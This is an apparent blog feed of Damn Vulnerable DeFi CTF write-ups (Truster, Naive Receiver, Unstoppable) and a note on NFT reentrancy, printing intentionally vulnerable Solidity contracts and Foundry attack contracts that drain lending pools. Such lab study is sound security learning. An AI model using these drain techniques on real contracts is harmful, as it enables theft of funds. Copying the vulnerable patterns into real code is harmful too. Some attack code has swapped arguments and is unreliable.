&#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        exp = new Exp(address(pool));</span><br><span class="line">        address owner = exp.getOwner();</span><br><span class="line">        assertEq(address(owner), address(attacker));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttacke() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        exp = new Exp(address(pool));</span><br><span class="line">        exp.attack(1000e18);</span><br><span class="line">        exp.withdraw();</span><br><span class="line">        assertEq(address(pool).balance, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/ray-so-export.png"></p>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
            <tag> DamnVulnerableDefi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-3</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-3/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-3/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</span><br><span class="line"></span><br><span class="line">The pool holds 1 million DVT tokens. You have nothing.</span><br><span class="line"></span><br><span class="line">To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TrusterLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract TrusterLenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    DamnValuableToken public immutable token;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    constructor(DamnValuableToken _token) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external nonReentrant returns (bool) &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        token.transfer(borrower, amount);</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        if (token.balanceOf(address(this)) &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><ul><li>similiar to FlashLoan,but not from IERC3156FlashLender ,instead its use target and calldata to call the callback function.</li><li>so we can see there is a functioncall in <code>flashLoan()</code> , which means we can excute  repay</li></ul><p>![[Pasted image 20231228103125.png]]</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../lib/forge-std/src/Test.sol&quot;;import &quot;../../src/3-truster/TrusterLenderPool.sol&quot;;import &quot;../../src/DamnValuableToken.sol&quot;;contract TmpAttacker &#123;    uint256 internal constant INITIAL_BALANCE = 100000e18;    address player;    address pool;    DamnValuableToken token;    constructor(address _player, address _pool, address _token) &#123;        player = _player;        pool = _pool;        token = DamnValuableToken(_token);    &#125;    function withdraw() external &#123;        token.transferFrom(pool, player, INITIAL_BALANCE);    &#125;&#125;contract Trustertest is Test &#123;    uint256 internal constant INITIAL_BALANCE = 100000e18;    function setUp(address _pool, address _token) public &#123;        TmpAttacker attacker = new TmpAttacker(msg.sender, _token, _pool);        TrusterLenderPool pool = TrusterLenderPool(_pool);        bytes memory data = abi.encodeWithSignature(            &quot;approve(address,uint256)&quot;,            attacker,            INITIAL_BALANCE        );        pool.flashLoan(0, address(attacker), _token, data);        attacker.withdraw();    &#125;    function testattack() public &#123;&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RTTA-1:AttackNFT</title>
      <link href="/2023/12/28/RTTA-1-AttackNFT/"/>
      <url>/2023/12/28/RTTA-1-AttackNFT/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>ERC721<br>ER155</p><h1 id="Common-Issues"><a href="#Common-Issues" class="headerlink" title="Common Issues"></a>Common Issues</h1><hr><h2 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h2><p>普通的重入攻击，攻击者通过合约漏洞循环调用合约，将合约中的资产转走或者铸造大量代币。转账NFT的时候不会触发合约的fallback或者receive函数，那为什么有重入风险。</p><p>因为在NFT标准中ERC721&#x2F;ERC1155,为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 <code>ERC721</code> 的 <code>safeTransferFrom()</code> 函数会调用目标地址的 <code>onERC721Received()</code> 函数，而黑客可以把恶意代码嵌入其中进行攻击。</p><p>危险函数</p><table><thead><tr><th>–</th><th>Function</th><th>External Function</th></tr></thead><tbody><tr><td>ERC721</td><td>safeTransferFrom</td><td>onERC721Received</td></tr><tr><td>ERC721</td><td><code>_safeMint</code></td><td>onERC721Received</td></tr><tr><td>ERC1155</td><td>safeTransferFrom</td><td>onERC1155Received</td></tr><tr><td>ERC1155</td><td><code>_safeBatchTransferFrom</code></td><td>onERC1155Received</td></tr><tr><td>ERC1155</td><td><code>_mint</code></td><td>onERC1155Received</td></tr></tbody></table><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><ol><li>检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。我们可以用这个模式修复有漏洞的<code>mint()</code>函数:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function mint() payable external &#123;</span><br><span class="line">// 检查是否mint过</span><br><span class="line">require(mintedAddress[msg.sender] == false);</span><br><span class="line">// 增加total supply</span><br><span class="line">totalSupply++;</span><br><span class="line">// 记录mint过的地址</span><br><span class="line">mintedAddress[msg.sender] = true;</span><br><span class="line">// mint</span><br><span class="line">_safeMint(msg.sender, totalSupply);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Logic-issues特权用户抢跑"><a href="#Logic-issues特权用户抢跑" class="headerlink" title="Logic issues特权用户抢跑"></a>Logic issues特权用户抢跑</h2><h2 id="NFT-Market-Issues"><a href="#NFT-Market-Issues" class="headerlink" title="NFT Market Issues"></a>NFT Market Issues</h2><ul><li><strong>Signature verification</strong></li></ul><h2 id="Audit-Example"><a href="#Audit-Example" class="headerlink" title="Audit Example"></a>Audit Example</h2><hr><p><a href="https://0xvolodya.hashnode.dev/nft-attacks">https://0xvolodya.hashnode.dev/nft-attacks</a></p><h2 id="Audit-Guidelines"><a href="#Audit-Guidelines" class="headerlink" title="Audit Guidelines"></a>Audit Guidelines</h2><p><a href="https://blog.quillaudits.com/2023/03/07/nft-marketplace-smart-contract-audit-guidelines/">https://blog.quillaudits.com/2023/03/07/nft-marketplace-smart-contract-audit-guidelines/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Solidity </tag>
            
            <tag> NFT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>About FuzzingTest</title>
      <link href="/2023/12/28/About-FuzzingTest/"/>
      <url>/2023/12/28/About-FuzzingTest/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blockchain </tag>
            
            <tag> Foundry </tag>
            
            <tag> FuzzTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-2</title>
      <link href="/2023/12/28/DamnVulnerableDeFi-2/"/>
      <url>/2023/12/28/DamnVulnerableDeFi-2/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.</span><br><span class="line"></span><br><span class="line">A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.</span><br><span class="line"></span><br><span class="line">Take all ETH out of the user’s contract. If possible, in a single transaction.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p><code>NaiveReceiverLenderPool.sol</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashLender.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;../../lib/solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &quot;./FlashLoanReceiver.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title NaiveReceiverLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender &#123;</span><br><span class="line">    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;</span><br><span class="line">    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line">    error CallbackFailed();</span><br><span class="line"></span><br><span class="line">    function maxFlashLoan(address token) external view returns (uint256) &#123;</span><br><span class="line">        if (token == ETH) &#123;</span><br><span class="line">            return address(this).balance;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashFee(address token, uint256) external pure returns (uint256) &#123;</span><br><span class="line">        if (token != ETH) revert UnsupportedCurrency();</span><br><span class="line">        return FIXED_FEE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)</span><br><span class="line">        external</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        if (token != ETH) revert UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">        // Transfer ETH and handle control to receiver</span><br><span class="line">        SafeTransferLib.safeTransferETH(address(receiver), amount);</span><br><span class="line">        if (receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data) != CALLBACK_SUCCESS) &#123;</span><br><span class="line">            revert CallbackFailed();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (address(this).balance &lt; balanceBefore + FIXED_FEE) &#123;</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allow deposits of ETH</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FlashloanReceiver.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;./NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title FlashLoanReceiver</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract FlashLoanReceiver is IERC3156FlashBorrower &#123;</span><br><span class="line">    address private pool;</span><br><span class="line">    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;</span><br><span class="line"></span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)</span><br><span class="line">        external</span><br><span class="line">        returns (bytes32)</span><br><span class="line">    &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // gas savings</span><br><span class="line">            if iszero(eq(sload(pool.slot), caller())) &#123;</span><br><span class="line">                mstore(0x00, 0x48f5c3ed)</span><br><span class="line">                revert(0x1c, 0x04)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (token != ETH) revert UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">        uint256 amountToBeRepaid;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            amountToBeRepaid = amount + fee;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _executeActionDuringFlashLoan();</span><br><span class="line"></span><br><span class="line">        // Return funds to pool</span><br><span class="line">        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);</span><br><span class="line"></span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Internal function where the funds received would be used</span><br><span class="line">    function _executeActionDuringFlashLoan() internal &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // Allow deposits of ETH</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p><code>NaiveReceiverLenderPool.sol</code>：<br>The contract is a lending pool that allows flash loans with a fixed fee of 1 ether . which means we need to repay our debt plus 1 ether after doing a flash loan.</p><p>Our Goal is to make the users account &#x3D;&gt; 0 ether , so maybe i will try to do ten times flashloan , which can make users account to 0 ether . </p><p>Vuln is in <code>onFlashLoan</code> function there is no access control . The first address is assumed.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)</span><br><span class="line">        external</span><br><span class="line">        returns (bytes32)</span><br><span class="line">    &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // gas savings</span><br><span class="line">            if iszero(eq(sload(pool.slot), caller())) &#123;</span><br><span class="line">                mstore(0x00, 0x48f5c3ed)</span><br><span class="line">                revert(0x1c, 0x04)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (token != ETH) revert UnsupportedCurrency();</span><br><span class="line">        uint256 amountToBeRepaid;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            amountToBeRepaid = amount + fee;</span><br><span class="line">        &#125;</span><br><span class="line">        _executeActionDuringFlashLoan();</span><br><span class="line">        // Return funds to pool</span><br><span class="line">        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);</span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>The function onFlashLoan is <strong>expected</strong> to be called by the flash loan contract, not the initiator. You should check msg.sender is the flash loan contract inside the onFlashLoan() function because this function is external and anyone can call it.</p></blockquote><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/2-naive-receiver/FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;../../src/2-naive-receiver/NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line">import &quot;../../lib/forge-std/src/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaiveReceiverLenderPoolTest is Test &#123;</span><br><span class="line">    NaiveReceiverLenderPool pool;</span><br><span class="line">    FlashLoanReceiver receiver;</span><br><span class="line"></span><br><span class="line">    uint256 internal constant INITIAL_BALANCE_Pool = 1000 ether;</span><br><span class="line">    uint256 internal constant INITIAL_BALANCE_Receiver = 10 ether;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        pool = new NaiveReceiverLenderPool();</span><br><span class="line">        receiver = new FlashLoanReceiver(address(pool));</span><br><span class="line">        vm.deal(address(pool), INITIAL_BALANCE_Pool);</span><br><span class="line">        vm.deal(address(receiver), INITIAL_BALANCE_Receiver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttackFlashLoan() public &#123;</span><br><span class="line">        assertEq(address(pool).balance, INITIAL_BALANCE_Pool);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">            pool.flashLoan(</span><br><span class="line">                IERC3156FlashBorrower(receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, &quot;0x&quot;</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        assertEq(address(receiver).balance, 0);</span><br><span class="line">        assertEq(address(pool).balance, INITIAL_BALANCE_Pool + INITIAL_BALANCE_Receiver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-1</title>
      <link href="/2023/12/28/DamnVulnerableDeFi-1/"/>
      <url>/2023/12/28/DamnVulnerableDeFi-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h1><hr><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Challenge #1 - Unstoppable</span><br><span class="line"></span><br><span class="line">There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.</span><br><span class="line"></span><br><span class="line">To pass the challenge, make the vault stop offering flash loans.</span><br><span class="line"></span><br><span class="line">You start with 10 DVT tokens in balance.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p><code>UnstoppableLender.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20&#125; from &quot;@openzeppelin-contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &#123;ReentrancyGuard&#125; from &quot;@openzeppelin-contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title DamnValuableToken</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract UnstoppableLender is ReentrancyGuard &#123;</span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    error MustDepositOneTokenMinimum();</span><br><span class="line">    error TokenAddressCannotBeZero();</span><br><span class="line">    error MustBorrowOneTokenMinimum();</span><br><span class="line">    error NotEnoughTokensInPool();</span><br><span class="line">    error FlashLoanHasNotBeenPaidBack();</span><br><span class="line">    error AssertionViolated();</span><br><span class="line"></span><br><span class="line">    constructor(address tokenAddress) &#123;</span><br><span class="line">        if (tokenAddress == address(0)) revert TokenAddressCannotBeZero();</span><br><span class="line">        damnValuableToken = IERC20(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function depositTokens(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        if (amount == 0) revert MustDepositOneTokenMinimum();</span><br><span class="line">        // Transfer token from sender. Sender must have first approved them.</span><br><span class="line">        damnValuableToken.transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        poolBalance = poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line">        if (borrowAmount == 0) revert MustBorrowOneTokenMinimum();</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        if (balanceBefore &lt; borrowAmount) revert NotEnoughTokensInPool();</span><br><span class="line"></span><br><span class="line">        // Ensured by the protocol via the `depositTokens` function</span><br><span class="line">        if (poolBalance != balanceBefore) revert AssertionViolated();</span><br><span class="line"></span><br><span class="line">        damnValuableToken.transfer(msg.sender, borrowAmount);</span><br><span class="line"></span><br><span class="line">        IReceiver(msg.sender).receiveTokens(</span><br><span class="line">            address(damnValuableToken),</span><br><span class="line">            borrowAmount</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        if (balanceAfter &lt; balanceBefore) revert FlashLoanHasNotBeenPaidBack();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function receiveTokens(address tokenAddress, uint256 amount) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ReceiverUnstoppable.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 